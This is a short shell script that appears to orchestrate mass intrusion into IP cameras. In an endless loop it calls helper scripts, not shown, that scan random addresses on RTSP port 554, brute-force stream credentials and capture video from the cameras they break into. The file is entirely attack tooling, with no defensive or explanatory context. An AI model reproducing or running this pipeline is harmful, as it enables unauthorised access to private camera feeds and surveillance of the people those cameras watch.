#!/usr/bin/env sh
while true; do
    echo
    echo Gather IPs
    ./fortune_port.py 554 -w 1024 -F -i tun0

    echo
    echo Brute
    ./rtsp_brute_simple.py \
        -w 1024 -i tun0 -sp > local/bruted.txt
    cat local/bruted.txt >> local/rtsp.txt

    echo
    echo Capture
    ./rtsp_capture.py local/bruted.txt -cb local/campost.sh
done

